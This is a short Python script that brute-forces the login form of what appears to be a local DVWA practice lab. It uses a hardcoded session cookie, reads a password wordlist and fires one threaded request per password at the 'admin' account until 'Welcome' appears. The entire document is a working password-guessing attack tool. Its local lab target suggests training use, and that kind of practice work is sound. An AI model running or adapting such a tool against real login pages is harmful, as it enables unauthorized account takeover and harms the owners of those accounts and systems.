import requests
import threading
import time
from datetime import datetime

session = requests.Session()
session.cookies.set("PHPSESSID", "bcb7286aaca4d765dfd02d06288883ba")
session.cookies.set("security", "low")

target = "http://127.0.0.1:42001/vulnerabilities/brute/"
username = "admin"
wordlist = input("Enter wordlist path: ")

with open(wordlist, "r", encoding="latin-1") as f:
    passwords = [p.strip() for p in f.readlines()]

print(f"\n{'='*50}")
print(f"[*] Target: {target}")
print(f"[*] Username: {username}")
print(f"[*] Passwords to try: {len(passwords)}")
print(f"[*] Started: {datetime.now()}")
print(f"{'='*50}\n")

found = threading.Event()
failed_attempts = 0
lock = threading.Lock()

def try_password(password):
    global failed_attempts
    
    if found.is_set():
        return
    
    r = session.get(target, params={
        "username": username,
        "password": password,
        "Login": "Login"
    })
    
    with lock:
        if "Welcome" in r.text and not found.is_set():
            found.set()
            print(f"\n[FOUND] Password: {password}")
            print(f"[*] Failed attempts: {failed_attempts}")
        else:
            failed_attempts += 1
            print(f"[TRYING] {password}")
    
    time.sleep(0.1)

threads = []
for password in passwords:
    t = threading.Thread(target=try_password, args=(password,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"\n{'='*50}")
print(f"[*] Completed: {datetime.now()}")
print(f"{'='*50}")
